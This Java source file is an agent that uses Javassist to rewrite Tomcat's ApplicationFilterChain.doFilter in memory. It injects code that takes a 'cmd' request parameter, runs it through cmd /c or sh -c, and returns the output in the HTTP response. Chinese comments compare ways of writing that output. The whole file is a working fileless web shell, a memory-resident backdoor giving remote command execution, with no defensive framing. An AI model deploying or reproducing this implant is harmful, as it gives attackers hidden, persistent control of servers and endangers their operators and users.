import javassist.*;

import java.lang.instrument.ClassFileTransformer;
import java.lang.instrument.IllegalClassFormatException;
import java.lang.instrument.Instrumentation;
import java.security.ProtectionDomain;


public class AgentMain {
    /*
    public static void premain(String agentArgs, Instrumentation inst) {
        agentmain(agentArgs, inst);
    }
    */

    public static final String ClassName = "org.apache.catalina.core.ApplicationFilterChain";

    public static void agentmain(String agentArgs, Instrumentation ins) {
        ins.addTransformer(new DefineTransformer(), true);
        Class[] classes = ins.getAllLoadedClasses();
        for (Class clas : classes) {
            if (clas.getName().equals(ClassName)) {
                try {
                    ins.retransformClasses(new Class[]{clas});    //retransformClasses
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }
    }

    public static class DefineTransformer implements ClassFileTransformer {
        @Override
        public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {
            className = className.replace("/", ".");
            if (className.equals(ClassName)) {
                //System.out.println("Find the Inject Class: " + ClassName);
                ClassPool pool = ClassPool.getDefault();
                try {
                    CtClass c = pool.getCtClass(className);
                    CtMethod m = c.getDeclaredMethod("doFilter");
                    // 如果服务端没有 javassist.jar 会是NULL 不会打印值
                    //System.out.println(c); // for debug // print : javassist.CtClassType@697a3904[public final class org.apache.catalina.core.ApplicationFilterChain implements javax.servlet.FilterChain...
                    //System.out.println(m); // for debug // print : javassist.CtMethod@8fc543ac[public doFilter (Ljavax/servlet/ServletRequest;Ljavax/servlet/ServletResponse;)V]

                    m.insertBefore("javax.servlet.http.HttpServletRequest req =  request;\n" +
                            "javax.servlet.http.HttpServletResponse res = response;\n" +
                            "java.lang.String cmd = request.getParameter(\"cmd\");\n" +
                            "if (cmd != null){\n" +
                            "java.io.InputStream in = null;\n" +
                            "java.lang.String osname = java.lang.System.getProperty(\"os.name\").toLowerCase();\n" +
                            "if (osname.contains(\"win\")) {" +
                            "    try {\n" +
                            "         in = Runtime.getRuntime().exec(new String[]{\"cmd\", \"/c\", cmd}).getInputStream();\n" +
                            "    }catch (Exception e){}\n" +
                            "} else {\n" +
                            "    try {\n" +
                            "        in = Runtime.getRuntime().exec(new String[]{\"sh\", \"-c\", cmd}).getInputStream();\n" +
                            "    }catch (Exception e){}\n" +
                            "}\n" +
                            "java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(in));\n" +
                            "try {\n" +
                            // 方法一： 完美!!! 通过close() 使输出一遍
                            "java.lang.String line;\n" +
                            "java.io.PrintWriter writer = res.getWriter();\n" +
                            "while ((line = reader.readLine()) != null) {\n" +
                            "writer.write(line+\"\\r\\n\");}\n" +
                            "writer.flush();\n" +
                            "writer.close();\n" +  // 输出流关闭操作放到循环外层

                            /*
                             方法二：
                             会输出5遍，具体原因可能与 ApplicationFilterChain 默认的几条链有关，没做深入研究...
                            //"java.io.PrintWriter writer=res.getWriter();\n" +
                            //"writer.print(reader.lines().collect(java.util.stream.Collectors.joining(\"\\n\")));\n" +
                             */

                            /*
                            方法三：
                            sevlet里面可以，在agent.jar里注入这种写法不行，原因未知
                            //"java.io.PrintWriter writer=res.getWriter();\n" +
                            //"writer.write(reader.lines().collect(java.util.stream.Collectors.joining(\"\\n\")));\n" +   //writer.write() 报错,  javassist.CannotCompileException: [source error] write(java.lang.Object) not found in java.io.PrintWriter
                             */

                            /*
                            方法四：
                            兼容性不好，中文不友好  java.io.CharConversionException: Not an ISO 8859-1 character: [�]
                            //"((java.io.PrintWriter)res.getWriter()).write(reader.lines().collect(java.util.stream.Collectors.joining(\"\\n\")));\n" +
                            //"res.getOutputStream().print(reader.lines().collect(java.util.stream.Collectors.joining(\"\\n\")).toString());\n" +   // javassist.CannotCompileException: [source error] print(java.lang.Object) not found in javax.servlet.ServletOutputStream
                            //"res.getOutputStream().flush();\n" +
                            //"res.getOutputStream().close();\n" +

                             */
                            "} catch (java.io.IOException e2) {\n" +
                            "   e2.printStackTrace();\n" +
                            "    }\n" +
                            "}");

                    byte[] bytes = c.toBytecode();
                    c.detach();
                    return bytes;
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
            return new byte[0];
        }
    }
}
